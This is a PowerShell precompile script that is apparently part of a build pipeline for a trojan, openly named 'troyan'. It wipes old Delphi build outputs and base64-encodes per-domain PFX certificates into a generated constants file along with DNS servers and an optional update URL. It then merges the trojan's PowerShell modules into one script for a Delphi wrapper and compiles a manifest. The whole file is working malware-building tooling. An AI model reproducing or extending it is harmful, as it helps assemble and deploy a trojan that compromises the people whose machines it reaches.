param (
    [string]$serverName
)
if ([string]::IsNullOrEmpty($serverName)) {
        throw "-serverName argument is null"
}
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
& (Join-Path -Path $scriptDir -ChildPath "../../sys/current.ps1") -serverName $serverName

Write-Host "preCompile"

if (Test-Path -Path $server.troyanDelphiScript) {
    Remove-Item -Path $server.troyanDelphiScript
}
if (Test-Path -Path $server.userDelphiExe)
{
    Remove-Item -Path $server.userDelphiExe
}

$extensions = @(".dcu", ".res", ".exe",".~pas","*.~dpr")
foreach ($ext in $extensions) {
    Get-ChildItem -Path $server.troyanDelphiDir -Filter "*$ext" | Remove-Item -Force
}
Get-ChildItem -Path $server.troyanDelphiDir -Filter "_*" | Remove-Item -Force



#certs
$template = @"
`$PrimaryDNSServer = '1.1.1.1'
`$SecondaryDNSServer = '2.2.2.2'
`$updateUrl = '_updateUrl'
`$xdata = @{
    JOPA
}
"@
$stringList = @()
foreach ($domain in $server.domains) {
    $pathPfx = pfxFile($domain)
    if ([string]::IsNullOrEmpty($pathPfx)) {
        throw "The certficiate is not found for domain: $domain"
    }
    $binaryData = [System.IO.File]::ReadAllBytes($pathPfx)
    $base64 = [Convert]::ToBase64String($binaryData)
    $chunkSize = 200
    $chunks = @()
    for ($i = 0; $i -lt $base64.Length; $i += $chunkSize) {
        $chunk = $base64.Substring($i, [Math]::Min($chunkSize, $base64.Length - $i))
        $chunks += $chunk
    }
    $code = "'" + ($chunks -join "'+ "  + [System.Environment]::NewLine + "'") + "'"
    $stringList += "'" + $domain + "'=" + $code
}
$listString = $stringList -join [System.Environment]::NewLine
$template = $template -replace "1\.1\.1\.1", $server.primaryDns
$template = $template -replace "2\.2\.2\.2", $server.secondaryDns
if ($server.autoUpdate)
{
    $template = $template -replace "_updateUrl", $server.updateUrl
}
$template  = $template -replace "JOPA", $listString
$template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath 'consts.ps1')

#join
$ps1Files = @(
    @(Get-ChildItem -Path $server.troyanScriptDir -Filter "consts.ps1"),
    @(Get-ChildItem -Path $server.troyanScriptDir -Filter "utils.ps1"),
    @(Get-ChildItem -Path $server.troyanScriptDir -Filter "*.ps1" | Where-Object { $_.Name -ne "update.ps1" -and $_.Name -ne "utils.ps1" -and $_.Name -ne "consts.ps1"  -and $_.Name -ne "program.ps1" }),
    @(Get-ChildItem -Path $server.troyanScriptDir -Filter "program.ps1")
) | ForEach-Object { $_ } | Where-Object { $_ -ne $null }

if ($server.autoUpdate)
{
    $ps1Files += (Get-ChildItem -Path $server.troyanScriptDir -Filter "update.ps1")
}

$joinedContent = ""
foreach ($file in $ps1Files) {
    $fileContent = Get-Content -Path $file.FullName -Raw
    $fileContent = $fileContent -replace '\.\s+\./[^/]+\.ps1', "`n`n"
    $fileContent = $fileContent -replace '. ./utils.ps1', "`n`n"
    $fileContent = $fileContent -replace '. ./consts.ps1', "`n`n"
    $joinedContent += $fileContent + [System.Environment]::NewLine
}
$joinedContent | Set-Content -Path $server.troyanDelphiScript -Encoding UTF8

& (Join-Path -Path $scriptDir -ChildPath "./precompile.embeddings.ps1") -serverName $serverName   

#compile manifest
$manifestFile = Join-Path -Path $scriptDir -ChildPath "dns.manifest.rc"
& "C:\Program Files (x86)\Borland\Delphi7\Bin\brcc32.exe" "$manifestFile"

Write-Host "Troyan preocmpile сomplete"